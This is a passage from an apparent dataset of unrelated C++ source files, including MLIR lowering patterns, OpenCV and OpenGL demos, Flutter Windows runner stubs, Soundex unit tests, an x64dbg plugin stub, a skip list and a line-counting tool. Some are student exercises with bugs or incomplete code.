adaptor,\n                  ConversionPatternRewriter &rewriter) const override;\n};\n\nstruct RotateOpLowering : public OpConversionPattern<hecate::earth::RotateOp> {\n  using OpConversionPattern<hecate::earth::RotateOp>::ConversionPattern;\n  RotateOpLowering(mlir::TypeConverter &converter, MLIRContext *ctxt)\n      : OpConversionPattern<hecate::earth::RotateOp>(converter, ctxt) {}\n\n  LogicalResult\n  matchAndRewrite(hecate::earth::RotateOp op, OpAdaptor adaptor,\n                  ConversionPatternRewriter &rewriter) const override;\n};\n\nstruct UpscaleOpLowering\n    : public OpConversionPattern<hecate::earth::UpscaleOp> {\n  using OpConversionPattern<hecate::earth::UpscaleOp>::ConversionPattern;\n  UpscaleOpLowering(mlir::TypeConverter &converter, MLIRContext *ctxt)\n      : OpConversionPattern<hecate::earth::UpscaleOp>(converter, ctxt) {}\n\n  LogicalResult\n  matchAndRewrite(hecate::earth::UpscaleOp op, OpAdaptor adaptor,\n                  ConversionPatternRewriter &rewriter) const override;\n};\n\nstruct RescaleOpLowering\n    : public OpConversionPattern<hecate::earth::RescaleOp> {\n  using OpConversionPattern<hecate::earth::RescaleOp>::ConversionPattern;\n  RescaleOpLowering(mlir::TypeConverter &converter, MLIRContext *ctxt)\n      : OpConversionPattern<hecate::earth::RescaleOp>(converter, ctxt) {}\n\n  LogicalResult\n  matchAndRewrite(hecate::earth::RescaleOp op, OpAdaptor adaptor,\n                  ConversionPatternRewriter &rewriter) const override;\n};\n\nstruct BootstrapOpLowering\n    : public OpConversionPattern<hecate::earth::BootstrapOp> {\n  using OpConversionPattern<hecate::earth::BootstrapOp>::ConversionPattern;\n  BootstrapOpLowering(mlir::TypeConverter &converter, MLIRContext *ctxt)\n      : OpConversionPattern<hecate::earth::BootstrapOp>(converter, ctxt) {}\n\n  LogicalResult\n  matchAndRewrite(hecate::earth::BootstrapOp op, OpAdaptor adaptor,\n                  ConversionPatternRewriter &rewriter) const override;\n};\n\nstruct ModswitchOpLowering\n    : public OpConversionPattern<hecate::earth::ModswitchOp> {\n  using OpConversionPattern<hecate::earth::ModswitchOp>::ConversionPattern;\n  ModswitchOpLowering(mlir::TypeConverter &conver",
    "#include <iostream>\n#include <opencv2/opencv.hpp>\n\ncv::Mat init_a()\n{\n    cv::Mat a = (cv::Mat_<int>(3, 3) << 1, 2, 3, 4, 5, 6, 7, 8, 9);\n\n    return a;\n}\n\ncv::Mat loop_init_b()\n{\n    cv::Mat b = cv::Mat_<int>(3, 3);\n    for (int i = 0; i < b.rows; i++)\n    {\n        for (int j = 0; j < b.cols; j++)\n        {\n            b.at<int>(i, j) = i + j;\n        }\n    }\n\n    return b;\n}\n\ncv::Mat cv_method_init_c()\n{\n    // Identity Matrix\n    // cv::Mat c = cv::Mat::eye(3, 3, CV_8UC1);\n\n    // Ones Matrix\n    // cv::Mat c = cv::Mat::ones(3, 3, CV_8UC1);\n\n    // Zero Matrix\n    // cv::Mat c = cv::Mat::zeros(3, 3, CV_8UC1);\n\n    // Diagonal Matrix\n    cv::Mat diag = (cv::Mat_<int>(1, 3) << 1, 2, 3);\n    cv::Mat c = cv::Mat::diag(diag);\n\n    return c;\n}\n\ncv::Mat array_method_init_d()\n{\n    cv::Mat d = (cv::Mat_<double>(3, 3) << 1.0, 2.1, 3.2, 4.0, 5.1, 6.2, 2, 2, 2);\n\n    return d;\n}\n\nint main(int argc, char **argv)\n{\n    // Enumeration method assignment a\n    cv::Mat a = init_a();\n    std::cout << \"a->\" << a << std::endl;\n\n    // loop method assignment b\n    cv::Mat b = loop_init_b();\n    std::cout << \"b->\" << b << std::endl;\n\n    // cv method assignment c\n    cv::Mat c = cv_method_init_c();\n    std::cout << \"c->\" << c << std::endl;\n\n    // array method assignment d\n    cv::Mat d = array_method_init_d();\n    std::cout << \"d->\" << d << std::endl;\n\n    // Basic operations: +, -, * /\n    cv::Mat add_a_b, sub_a_b, sub_a_1, multi_a, multi_d, div_d;\n    add_a_b = a + b;\n    std::cout << \"a+b->\" << add_a_b << std::endl;\n\n    sub_a_b = a - b;\n    std::cout << \"a-b->\" << sub_a_b << std::endl;\n\n    sub_a_1 = a - 1;\n    std::cout << \"a-1->\" << sub_a_1 << std::endl;\n\n    multi_a = 2.3 * a;\n    std::cout << \"2.3*a->\" << multi_a << std::endl;\n\n    multi_d = 2 * d;\n    std::cout << \"2*d->\" << multi_d << std::endl;\n\n\n    // matrix multiplication operation: the type of Mat must be float or double\n    cv::Mat matrix_multi_d_d;\n    matrix_multi_d_d = d*d;\n    std::cout << \"d*d->\" << matrix_multi_d_d << std::endl;\n\n    // vector dot operation: the input matrix would be reshaped to one vector to calculate the inner product\n    // the inner product is a double num\n    double vector_dot_a_c;\n    vector_dot_a_c = a.dot(c);\n    std::cout << \"a.dot(c)->\" << vector_dot_a_c << std::endl;\n\n    // Corresponding element multiplication operation: the type of output Mat is the same as input Mat in default\n    cv::Mat element_mul_a_c;\n    element_mul_a_c = a.mul(c);\n    std::cout << \"element_mul_a_c->\" << element_mul_a_c << std::endl;\n\n    return 0;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"shopa\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"riverpod_files\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\nusing namespace std;\n\ntypedef enum {manzana=1, naranja, pera, banana, kiwi, mandarina} tFrutas;\n\nstring nombre_fruta(tFrutas fruta);\n\nint main (){\n\n    string proveedor, razon_social, fechaHoy, fechaEntrega;\n    int opcion_fruta;\n    const int FRUTAS = 6;\n    tFrutas frutas_pedidas [FRUTAS]; \n    int contador= 0;\n\n    //Pedir al usuario los datos\n    cout << \"Codigo del proveedor: \";\n    cin >> proveedor;\n    cin.sync();\n    cout << \"Razon social: \";\n    getline (cin, razon_social);\n    cout << \"Fecha de solicitud dd/mm/aa: \";\n    cin >> fechaHoy;\n    cout << \"Fecha de entrega dd/mm/aa: \";\n    cin >> fechaEntrega;\n\n    cout << \"Ingrese las opciones de las Frutas que desea pedir (presione 0 para terminar)\" << endl;\n    cout << \"1 - Manzana \" << endl;\n    cout << \"2 - Naranja \" << endl;\n    cout << \"3 - Pera \" << endl;\n    cout << \"4 - Banana \" << endl;\n    cout << \"5 - Kiwi \" << endl;\n    cout << \"6 - Mandarina \" << endl;\n    cout << \"0 - Finalizar \" << endl;\n    cout << \"Opcion: \";\n    cin >> opcion_fruta;\n    while (opcion_fruta != 0){\n        if (opcion_fruta >=1 && opcion_fruta <=6){\n            if(contador < FRUTAS){\n            tFrutas fruta = tFrutas (opcion_fruta); // Conversion de enumeradores a enteros\n            frutas_pedidas [contador] = fruta; // Cada fruta elegida se guarda en el contador\n            contador++; \n            cout << \"Fruta seleccionada: \" << nombre_fruta (fruta) << endl; //Funcion que devuelve el nombre\n            }\n        else {\n                cout << \"Maximo de frutas alcanzado\" << endl;\n            break;\n        }\n        }\n        else {\n            cout << \"Opcion no valida. Seleccione las opciones disponibles (0 para terminar)\" << endl;        \n            }\n        cout << \"Opcion: \";\n        cin >> opcion_fruta; // Otra fruta para continuar en el while\n    }\n\n    // Mostrar los datos\n    cout << \"----Datos del Pedido----\" << endl;\n    cout << \"Codigo Proveedor: \" << proveedor << endl;\n    cout << \"Razon Social: \" << razon_social << endl;\n    cout << \"Fecha de Solicitud: \" << fechaHoy << endl;\n    cout << \"Fecha de Entrega: \" << fechaEntrega << endl;\n    cout << \"Frutas Pedidas: \";\n    for (int i = 0; i < contador; ++i) {\n        cout << nombre_fruta(frutas_pedidas[i]);//Imprime el nombre de la fruta\n        if (i < contador - 1) { \n            cout << \", \"; //Imprime una coma despues de cada fruta, excepto en la ultima.\n        }\n    }\n    cout << endl;\n    \n    return 0;\n}\nstring nombre_fruta(tFrutas fruta) {\n    string cadFrutas;\n    switch (fruta) {\n        case manzana: { \n            cout << \"Manzana\";\n        } break;\n        case naranja: { \n            cout <<\"Naranja\";\n        } break;\n        case pera: { \n            cout << \"Pera\";\n        } break;\n        case banana: { \n            cout << \"Banana\";\n        } break;\n        case kiwi: { \n            cout << \"Kiwi\";\n        } break;\n        case mandarina: { \n            cout << \"Mandarina\";\n        } break;\n    }\n    return cadFrutas;\n}\n",
    "// #include<stdio.h>\n// int main(){\n//     printf(\"HELLO WORLD \");\n//     return 0;\n    \n// }\n\n\n// #include<iostream>\n// using namespace std;\n// int main(){\n//     int marks;\n    \n//     cin>>marks;\n//     if(marks>=90){\n//         cout<<\"A+\";\n\n//     }\n//     else if(marks>=80){\n//         cout<<\"A\";\n\n//     }\n//     else if(marks>=70){\n//         cout<<\"B+\";\n\n//     }\n//     else if(marks>=60){\n//         cout<<\"B\";\n//     }\n//     cout<<endl;\n//     cout<<\"your grade is: \" << marks <<endl;\n// }\n\n\n// #include<bits/stdc++.h>\n// using namespace std;\n// int main(){\n//     int i;\n//     int n;\n//     int count =0;\n//     cin\n//     cin>>n;\n//     for(i=1;i<=n;i++){\n//         if(n%i==0){\n//             count++;\n//         }\n\n\n\n//     }\n//     if(count ==2 ){\n//         cout<<\"prime\";\n\n//     }\n//     else{\n//         cout<<\"not prime\";\n//     }\n\n    \n\n\n    \n// }\n\n\n\n// #include<bits/stdc++.h>\n// using namespace std;\n// int main(){\n//     int n;\n//     int i , sum =0;\n\n//     cout<<\"enter the number \";\n//     cin>>n;\n\n//     for(i=0;i<=n;i++){\n//         sum = sum + i;\n//         cout<<i;\n//         cout<<endl;\n//     }\n//     cout<<sum;\n\n\n// }\n\n\n\n// #include<bits/stdc++.h>\n// using namespace std;\n// int main(){\n//     int n ;\n//     int i;\n//     int fact = 1;\n//     cout<<\"ENTER THE NUMBER \";\n//     cin>>n;\n//     for(i=n;i>0;i--){\n//         fact = fact*i;\n//     }\n//     cout<<fact;\n\n// }\n\n\n\n// #include<bits/stdc++.h>\n// using namespace std;\n// int main(){\n//     int i;\n//     int n;\n//     cout<<\"enter no. of rows: \";\n//     cin>>n;\n//     for(i=1;i<=n;i++){\n        \n//         for(int j = 0;j<=2*n;j++){\n//             if(j>n-i && j<n+i){\n//                 cout<<\"1\";\n//             }\n//             else{\n//                 cout<<\" \";\n//             }\n\n\n//         }\n//         cout<<endl;\n\n//     }\n\n\n// }\n\n\n\n#include<bits/stdc++.h>\nusing namespace std;\nint facto(int n){\n    if(n == 1){\n        return 1;\n    }\n    else if( n == 2){\n        return 2;\n    }\n    else{\n        return n\n    }\n}",
    "#include <gtest/gtest.h>\n#include \"Soundex.h\"\n\nTEST(SoundexTest, GeneratesCorrectSoundexForEmptyString) {\n    EXPECT_EQ(generateSoundex(\"\"), \"\");\n}\n\nTEST(SoundexTest, PadsSoundexToFourCharacters) {\n    EXPECT_EQ(generateSoundex(\"A\"), \"A000\");\n    EXPECT_EQ(generateSoundex(\"Y\"), \"Y000\");\n}\n\nTEST(SoundexTest, GeneratesCorrectSoundexForValidName) {\n    EXPECT_EQ(generateSoundex(\"Robert\"), \"R163\");\n    EXPECT_EQ(generateSoundex(\"Rupert\"), \"R163\");\n    EXPECT_EQ(generateSoundex(\"Rubin\"), \"R150\");\n}\n\nTEST(SoundexTest, IgnoresNonAlphabeticCharacters) {\n    EXPECT_EQ(generateSoundex(\"R2obert\"), \"R163\");\n    EXPECT_EQ(generateSoundex(\"R!upert\"), \"R163\");\n    EXPECT_EQ(generateSoundex(\"Ru#bin\"), \"R150\");\n}\n\nTEST(SoundexTest, GeneratesSameSoundexForSimilarNames) {\n    EXPECT_EQ(generateSoundex(\"Ashcraft\"), \"A261\");\n    EXPECT_EQ(generateSoundex(\"Ashcroft\"), \"A261\");\n}\n\nTEST(SoundexTest, HandlesUpperAndLowerCaseCharacters) {\n    EXPECT_EQ(generateSoundex(\"Robert\"), generateSoundex(\"robert\"));\n    EXPECT_EQ(generateSoundex(\"Rupert\"), generateSoundex(\"RUPERT\"));\n    EXPECT_EQ(generateSoundex(\"Rubin\"), generateSoundex(\"RuBiN\"));\n}\n\nint main(int argc, char **argv) {\n    ::testing::InitGoogleTest(&argc, argv);\n    return RUN_ALL_TESTS();\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"weather_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"pluginmain.h\"\n#include \"plugin.h\"\n\n// NOTE: This is mostly just boilerplate code, generally you work in plugin.cpp\n// Reference: https://help.x64dbg.com/en/latest/developers/plugins/basics.html#exports\n\nint pluginHandle;\nHWND hwndDlg;\nint hMenu;\nint hMenuDisasm;\nint hMenuDump;\nint hMenuStack;\nint hMenuGraph;\nint hMenuMemmap;\nint hMenuSymmod;\n\nPLUG_EXPORT bool pluginit(PLUG_INITSTRUCT* initStruct)\n{\n    initStruct->pluginVersion = PLUGIN_VERSION;\n    initStruct->sdkVersion = PLUG_SDKVERSION;\n    strncpy_s(initStruct->pluginName, PLUGIN_NAME, _TRUNCATE);\n    pluginHandle = initStruct->pluginHandle;\n    return pluginInit(initStruct);\n}\n\nPLUG_EXPORT bool plugstop()\n{\n    pluginStop();\n    return true;\n}\n\nPLUG_EXPORT void plugsetup(PLUG_SETUPSTRUCT* setupStruct)\n{\n    hwndDlg = setupStruct->hwndDlg;\n    hMenu = setupStruct->hMenu;\n    hMenuDisasm = setupStruct->hMenuDisasm;\n    hMenuDump = setupStruct->hMenuDump;\n    hMenuStack = setupStruct->hMenuStack;\n    hMenuGraph = setupStruct->hMenuGraph;\n    hMenuMemmap = setupStruct->hMenuMemmap;\n    hMenuSymmod = setupStruct->hMenuSymmod;\n    pluginSetup();\n}",
    "#include \"SkipList.h\"\n\nusing namespace std;\n\nSkipList:: SkipList()\n{\n    head = new Node(0, maxNumberOfLevel);    // Initializing the skip list with the max number of levels\n\n    Level = 0;                               // At start the level is 0\n\n}\n\nvoid insert(int data)\n{\n    int newLevel = 0;\n\n\n    // Deciding the level of inserting node on the basis of coin toss\n\n    while (newLevel < maxNumberOfLevel and (rand() % 2) == 1) // here rand()%2 is doing the coin toss\n    {\n        newLevel++;\n    }\n    // Resizing the size of the levels to make place for the inserting value\n\n    if (Level < newLevel)\n    {\n        head->next.resize(newLevel + 1, nullptr);\n\n        Level = newLevel;\n    }\n\n\n    Node* current = head; // pointer to the head to traverse through the skip list\n\n\n    vector<Node*> Update(Level + 1, nullptr); // To store the update node at eah level\n\n    // Loop over the levels upto which we want the value to be inserted\n\n    for (int i = Level; i >= 0; i--)\n    {\n        // Finding the place for the inserting value\n\n        while (current->next[i] and current->next[i]->data < data)\n        {\n            current = current->next[i];\n        }\n        // Updating the level accordingly\n\n        Update[i] = current;\n\n    }\n\n    current = current->next[0];   // Moves the current to the next node at level 0\n\n    if (current == nullptr or current->data != data) // if the current is null then it does not exit we need to insert the value\n    {\n        Node* newNode = new Node(data, Level);\n\n        for (int i = 0; i <= newLevel; i++)\n        {\n            newNode->next[i] = Update[i]->next[i];\n\n            Update[i]->next[i] = newNode;  // To insert the value at each level\n\n        }\n\n        cout << \"Element \" << data << \" inserted successfully.\\n\";\n    }\n    else\n    {\n        cout << \"Element \" << data << \" already exists.\\n\";  // Incase if value already exists\n    }\n}\n\n\nvoid remove(int data)\n{\n    // Function to remove value\n    Node* current = head; // start by setting a current pointer to the head node\n\n    vector<Node*> Update(Level + 1, nullptr); // Create an update vector to store the updated node at each level, Remember only those nodes will be updated where the value to be deleted is present.\n\n\n\n    for (int i = Level; i >= 0; i--)\n    {\n        while (current->next[i] and current->next[i]->data < data)\n        {\n            current = current->next[i];\n        }\n\n        Update[i] = current;         // Update array is keeping the track, where the changes should be made, after deleting the node.\n    }\n\n    current = current->next[0];     // Set the current pointer to the next node at level 0.\n\n    if (current != nullptr and current->data == data) // If the value is present then delete the value\n    {\n        for (int i = 0; i <= Level; i++)      // Deleting the value from each level\n        {\n            // Setting the pointers\n            if (Update[i]->next[i] != current)\n            {\n                break;\n            }\n            else\n            {\n                Update[i]->next[i] = current->next[i];\n            }\n        }\n\n        delete current; // deleting the node\n\n        while (Level > 0 and head->next[Level] == nullptr)  // decrement the level variable incase there is not any value at that level\n        {\n            Level--;\n        }\n\n        cout << \"Element \" << data << \" deleted successfully.\"<<endl;\n    }\n    else // Incase the value does not exist\n    {\n        cout << \"Element \" << data << \" not found.\"<<endl;\n    }\n}\n\n\nbool search(int data)\n{\n    Node* current = head;           // start by setting a current pointer to the head node to traverse through the skip list\n\n\n    for (int i = Level; i >= 0; i--) // Begin traversing from the top level and iteratively approaching the bottom of the skip list\n    {\n        while (current->next[i] and current->next[i]->data < data) // keep on moving forward if the value of the next node is less than the searching node otherwise  move downward (handled by outer for loop)\n        {\n            current = current->next[i]; // moving forward\n\n        }\n    }\n\n    current = current->next[0]; // Move to the next of the node at level 0\n\n    if (current != nullptr && current->data == data) // if value is found\n    {\n        cout << \"Element \" << data << \" found.\\n\";\n        return true;\n    }\n    else  // Incase value does not exist\n    {\n        cout << \"Element \" << data << \" not found.\\n\";\n        return false;\n    }\n}\n\n\nvoid display()\n{\n\n    cout << \"skip List:\"<< endl;\n\n    for (int i = Level; i >= 0; i--) //\n    {\n        Node* current = head->next[i]; // Initializes the pointer to the first node of that level\n\n        cout << \"Level \" << i << \": \";\n\n        while (current != nullptr)       // Start displaying all the values present at that level\n        {\n            cout << current->data << \" \";\n            current = current->next[i]; // Moving to the right of the node\n        }\n        cout << endl;\n    }\n}\n\n",
    "#define GLAD_GL_IMPLEMENTATION\n#include <glad/gl.h>\n#define GLFW_INCLUDE_NONE\n#include <GLFW/glfw3.h>\n\n#include <glm/glm.hpp>\n#include <glm/gtc/matrix_transform.hpp>\n#include <glm/gtc/type_ptr.hpp>\n\n//#include \"stb_image.h\"\n\n#include <random>\n#include <unordered_set>\n#include <cmath>\n\n#include \"Texture.h\"\n#include \"shaderClass.h\"\n#include \"Vertex.h\"\n#include \"VAO.h\"\n#include \"VBO.h\"\n#include \"EBO.h\"\n#include \"Camera.h\"\n\n#define TINYOBJLOADER_IMPLEMENTATION\n#include \"tiny_obj_loader.h\"\n\n\nconst unsigned int width = 800;\nconst unsigned int height = 600;\n\n\n\n\nGLfloat lightVertices[] =\n{ //     COORDINATES     //\n    -1.0f, -1.0f,  1.0f,\n    -1.0f, -1.0f, -1.0f,\n    1.0f, -1.0f, -1.0f,\n    1.0f, -1.0f,  1.0f,\n    -1.0f,  1.0f,  1.0f,\n    -1.0f,  1.0f, -1.0f,\n    1.0f,  1.0f, -1.0f,\n    1.0f,  1.0f,  1.0f\n};\n\nGLuint lightIndices[] =\n{\n    0, 1, 2,\n    0, 2, 3,\n    0, 4, 7,\n    0, 7, 3,\n    3, 7, 6,\n    3, 6, 2,\n    2, 6, 5,\n    2, 5, 1,\n    1, 5, 4,\n    1, 4, 0,\n    4, 5, 6,\n    4, 6, 7\n};\n\n\n\nbool loadObj(const std::string& objFilePath, std::vector<Vertex>& vertices, std::vector<GLuint>& indices) {\n    tinyobj::attrib_t attrib;\n    std::vector<tinyobj::shape_t> shapes;\n    std::vector<tinyobj::material_t> materials;\n    std::string warn, err;\n\n    // Cargar el archivo .obj utilizando tinyobjloader\n    bool ret = tinyobj::LoadObj(&attrib, &shapes, &materials, &warn, &err, objFilePath.c_str());\n\n    if (!warn.empty()) {\n        std::cout << \"Warning loading OBJ: \" << warn << std::endl;\n    }\n\n    if (!err.empty()) {\n        std::cerr << \"Error loading OBJ: \" << err << std::endl;\n    }\n\n    if (!ret) {\n        std::cerr << \"Failed to load OBJ file: \" << objFilePath << std::endl;\n        return false;\n    }\n\n    // Procesar los v\u00e9rtices y los \u00edndices\n    for (const auto& shape : shapes) {\n        for (const auto& index : shape.mesh.indices) {\n            Vertex vertex;\n\n            // Posiciones\n            vertex.position[0] = attrib.vertices[3 * index.vertex_index + 0];\n            vertex.position[1] = attrib.vertices[3 * index.vertex_index + 1];\n            vertex.position[2] = attrib.vertices[3 * index.vertex_index + 2];\n\n            // Normales\n            vertex.normal[0] = attrib.normals[3 * index.normal_index + 0];\n            vertex.normal[1] = attrib.normals[3 * index.normal_index + 1];\n            vertex.normal[2] = attrib.normals[3 * index.normal_index + 2];\n\n            // Coordenadas de textura\n            if (index.texcoord_index >= 0) {\n                vertex.texCoord[0] = attrib.texcoords[2 * index.texcoord_index + 0];\n                vertex.texCoord[1] = attrib.texcoords[2 * index.texcoord_index + 1];\n            }\n\n            // Colores (si est\u00e1n disponibles en tu modelo)\n            vertex.color[0] = attrib.colors[3 * index.vertex_index + 0];\n            vertex.color[1] = attrib.colors[3 * index.vertex_index + 1];\n            vertex.color[2] = attrib.colors[3 * index.vertex_index + 2];\n\n            vertices.push_back(vertex);\n            indices.push_back(indices.size());\n        }\n    }\n\n    return true;\n}\n\n\n\nstruct Model {\n    std::vector<Vertex> vertices;\n    std::vector<GLuint> indices;\n    VAO vao;\n    VBO vbo;\n    EBO ebo;\n    std::string ModelName;\n    Texture texture;\n\n    Model(const std::vector<Vertex>& vertices, const std::vector<GLuint>& indices, const std::string& modelName, const Texture& texture)\n    : vertices(vertices), indices(indices), texture(texture) ,ModelName(modelName),\n    vao(), vbo(vertices), ebo(indices) {\n        vao.Bind();\n        vbo.Bind();\n        vao.LinkAttrib(vbo, 0, 3, GL_FLOAT, sizeof(Vertex), (void*)offsetof(Vertex, position));\n        vao.LinkAttrib(vbo, 1, 3, GL_FLOAT, sizeof(Vertex), (void*)offsetof(Vertex, color));\n        vao.LinkAttrib(vbo, 2, 2, GL_FLOAT, sizeof(Vertex), (void*)offsetof(Vertex, texCoord));\n        vao.LinkAttrib(vbo, 3, 3, GL_FLOAT, sizeof(Vertex), (void*)offsetof(Vertex, normal));\n        ebo.Bind();\n        vao.Unbind();\n        vbo.Unbind();\n        ebo.Unbind();\n    }\n};\n\n\n\n\n\n\n\n// Funci\u00f3n para verificar si la nueva posici\u00f3n est\u00e1 a una distancia m\u00ednima de las existentes.\nbool isFarEnough(const glm::vec3& newPos, const std::vector<glm::vec3>& positions, float minDist) {\n    for (const auto& pos : positions) {\n        if (glm::distance(newPos, pos) < minDist) {\n            return false;\n        }\n    }\n    return true;\n}\n\n\n// Funci\u00f3n para verificar si la nueva roca est\u00e1 tocando dos o tres rocas existentes y devolver las rocas tocadas.\nstd::vector<glm::vec3> findTouchingRocks(const glm::vec3& newPos, const std::vector<glm::vec3>& positions, float touchDist) {\n    std::vector<glm::vec3> touchingRocks;\n    for (const auto& pos : positions) {\n        if (glm::distance(newPos, pos) < touchDist) {\n            touchingRocks.push_back(pos);\n            if (touchingRocks.size() >= 3) {\n                break;\n            }\n        }\n    }\n    return touchingRocks;\n}\n\n\n\n\n\nvoid updateWaveModel(Model& model, float time) {\n    float amplitude = 10",
    "#include <iostream>\n#include <string>\n#include <vector>\n#include <filesystem>\n#include <fstream>\n\nstatic const int WHITE = 37;\nstatic const int RED = 31;\nstatic const int YELLOW = 33;\nstatic const int GREEN = 32;\nstatic const int CYAN = 36;\nstatic const int BLUE = 34;\nstatic const int MAGENTA = 35;\n\nvoid color_print(const std::string& msg, int color)\n{\n    std::cout << \"\\033[\" << color << \"m\" << msg << \"\\033[0m\";\n}\n\nvoid err(const std::string& msg)\n{\n    color_print(\"LC Error: \" + msg + \"\\n\", RED);\n}\n\nint main(int argc, char** argv)\n{\n\n    std::vector<std::string> args;\n    for (int i = 1; i < argc; i++)\n    {\n        args.push_back(std::string(argv[i]));\n    }\n\n    bool recursive = false, noEmpty = false, progress = false;\n    std::string dir;\n    std::vector<std::string> extensions;\n\n    for (int i = 0; i < args.size(); i++)\n    {\n        std::string& arg = args[i];\n\n        if (arg.length() >= 2) if (arg.substr(0, 2) == \"--\")\n        {\n            if (!(arg == \"--r\" || arg == \"--ne\" || arg == \"--p\" || arg == \"--help\"))\n            {\n                err(\"Unknown argument '\" + arg + \"' (Use --help for a list of valid arguments)\");\n                return -1;\n            }\n            else if (arg == \"--help\")\n            {\n                color_print(\"LC Arguments:\\n\", WHITE);\n                color_print(\"-ext\", CYAN); std::cout << \"       extensions (should be followed by a list of space-separated extensions (with '.') surrounded by quotes, LC will count only files with these extensions)\\n\";\n                color_print(\"--r\", CYAN); std::cout << \"        recursive (searches subdirectories too)\\n\";\n                color_print(\"--ne\", CYAN); std::cout << \"       no empty (don't count empty lines)\\n\";\n                color_print(\"--p\", CYAN); std::cout << \"        progress (show progress per-file, will greatly decrease speed if there are many files)\\n\";\n                color_print(\"--help\", CYAN); std::cout << \"     help (prints this message)\\n\\n\";\n                color_print(\"Example: \", WHITE); color_print(\"lc --r --p -ext \\\".cpp .h\\\" C:/dev/\\n\", CYAN);\n                color_print(\"This example will count all the lines of all .cpp or .h files found in the 'C:/dev/' directory and all subdirectories (recursive) and print the progress per-file. It will count empty lines, because --ne was not used.\\n\", WHITE); \n                return 0;\n            }\n            else if (arg == \"--r\") recursive = true;\n            else if (arg == \"--ne\") noEmpty = true;\n            else if (arg == \"--p\") progress = true;\n        }\n        else if (arg.length() >= 1) if (arg.substr(0, 1) == \"-\")\n        {\n            if (arg != \"-ext\")\n            {\n                err(\"Unknown argument '\" + arg + \"' (Use --help for a list of valid arguments)\");\n                return -1;\n            }\n\n            if (i == args.size() - 1)\n            {\n                err(\"The '-ext' argument requires a subsequent argument\");\n                return -1;\n            }\n\n            std::string exts = args[i + 1];\n            std::vector<std::string> vExts;\n            int start = 0, end = 0;\n            for (int i = 0; i <= exts.length(); i++)\n            {\n                if (i == exts.length())\n                {\n                    end = i;\n                    vExts.push_back(exts.substr(start, end - start));\n                }\n                else if (exts[i] == ' ')\n                {\n                    end = i;\n                    vExts.push_back(exts.substr(start, end - start));\n                    start = i + 1;\n                }\n            }\n\n            extensions = vExts;\n\n            i++;\n        }\n        else\n        {\n            if (!std::filesystem::exists(arg)) \n            {\n                err(\"Path does not exist: '\" + arg + \"'\");\n                return -1;\n            }\n            else if (!std::filesystem::is_directory(arg)) \n            {\n                err(\"Path is not a directory: '\" + arg + \"'\");\n                return -1;\n            }\n            dir = arg;\n        }\n    }\n\n    color_print(\"Recursion ------------ \" + std::string(recursive ? \" ON\\n\" : \"OFF\\n\"), CYAN);\n    color_print(\"Exclude empty lines -- \" + std::string(noEmpty ? \" ON\\n\" : \"OFF\\n\"), CYAN);\n    color_print(\"Progress ------------- \" + 